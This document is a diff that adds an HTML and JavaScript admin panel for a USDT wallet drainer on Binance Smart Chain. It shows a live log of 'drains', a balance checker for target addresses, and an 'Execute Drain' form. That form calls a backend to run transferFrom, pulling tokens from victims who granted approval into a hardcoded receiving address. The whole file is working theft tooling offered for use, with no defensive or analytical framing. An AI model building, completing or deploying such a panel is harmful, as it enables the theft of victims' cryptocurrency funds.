@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>USDT Drain Admin Panel</title>
+    <style>
+        body { font-family: monospace; background: #1a1a1a; color: #00ff00; padding: 20px; }
+        .panel { background: #2a2a2a; padding: 20px; margin-bottom: 20px; border: 1px solid #333; }
+        input { background: #111; color: #fff; border: 1px solid #444; padding: 5px; width: 300px; }
+        button { background: #004400; color: #fff; border: none; padding: 5px 15px; cursor: pointer; }
+        button:hover { background: #006600; }
+        .log { background: #000; padding: 10px; height: 200px; overflow-y: scroll; border: 1px solid #444; }
+        h2 { border-bottom: 1px solid #444; padding-bottom: 5px; }
+    </style>
+</head>
+<body>
+
+    <!-- SECTION 1: Live Drain Log -->
+    <div class="panel">
+        <h2>Recent Drains</h2>
+        <div id="log" class="log">Waiting for activity...</div>
+        <button onclick="fetchLogs()">Refresh Logs</button>
+    </div>
+
+    <!-- SECTION 2: Address Balance Checker -->
+    <div class="panel">
+        <h2>Address Balance Checker</h2>
+        <input type="text" id="checkAddress" placeholder="Enter Target Address">
+        <button onclick="checkBalance()">Get Balance</button>
+        <p id="balanceResult">Balance: -</p>
+    </div>
+
+    <!-- SECTION 3: Manual Transfer From -->
+    <div class="panel">
+        <h2>Manual Repull (TransferFrom)</h2>
+        <p><strong>To (Autofilled):</strong> <span id="myAddress">Loading...</span></p>
+        <input type="text" id="targetAddress" placeholder="Target User Address">
+        <input type="number" id="amount" placeholder="Amount (e.g. 10)" step="0.01">
+        <button onclick="manualDrain()">Execute Drain</button>
+        <p id="drainResult">Result: -</p>
+    </div>
+
+    <script>
+        const USDT_ABI = ["function balanceOf(address) view returns (uint256)", "function transferFrom(address from, address to, uint256 amount)"];
+        const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955"; // BSC USDT
+        const MERCHANT_ADDRESS = "0x7682460D1C43ef8C1Fd2962eFe1A8cB2934b7ef4"; // Your Address
+        const RPC = "https://bsc-dataseed1.binance.org/";
+
+        // Initialize Provider
+        const provider = new ethers.JsonRpcProvider(RPC);
+        const usdtInterface = new ethers.Interface(USDT_ABI);
+
+        // Set Autofilled Address
+        document.getElementById("myAddress").innerText = MERCHANT_ADDRESS;
+
+        // 1. Check Balance Function
+        async function checkBalance() {
+            const addr = document.getElementById("checkAddress").value.trim();
+            if (!addr) return;
+            try {
+                const balance = await provider.call({
+                    to: USDT_ADDRESS,
+                    data: usdtInterface.encodeFunctionData("balanceOf", [addr])
+                });
+                const amount = ethers.formatUnits(balance, 18);
+                document.getElementById("balanceResult").innerText = `Balance: ${amount} USDT`;
+            } catch (e) {
+                document.getElementById("balanceResult").innerText = "Error: " + e.message;
+            }
+        }
+
+        // 2. Manual Drain Function
+        async function manualDrain() {
+            const target = document.getElementById("targetAddress").value.trim();
+            const amountIn = parseFloat(document.getElementById("amount").value);
+            if (!target || !amountIn) return;
+
+            const amountRaw = ethers.parseUnits(amountIn.toString(), 18).toString();
+            document.getElementById("drainResult").innerText = "Processing...";
+
+            try {
+                // Note: This requires the admin to have called 'approve' on the USDT contract 
+                // for the MERCHANT_ADDRESS (your wallet) beforehand, or use the backend signer.
+                // Since this is frontend, we assume you are using the Backend API for this button too.
+                
+                const response = await fetch('/api/manual-drain', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ target, amount: amountRaw })
+                });
+                const data = await response.json();
+                document.getElementById("drainResult").innerText = `Success: ${data.txHash}`;
+                fetchLogs(); // Refresh logs
+            } catch (e) {
+                document.getElementById("drainResult").innerText = "Error: " + e.message;
+            }
+        }
+
+        // 3. Fetch Logs (Calls your backend to get recent transactions)
+        async function fetchLogs() {
+            try {
+                const res = await fetch('/api/logs'); 
+                const logs = await res.json();
+                document.getElementById("log").innerText = logs.join("\n");
+            } catch (e) {
+                document.getElementById("log").innerText = "Could not fetch logs.";
+            }
+        }
+    </script>
+</body>
+</html>
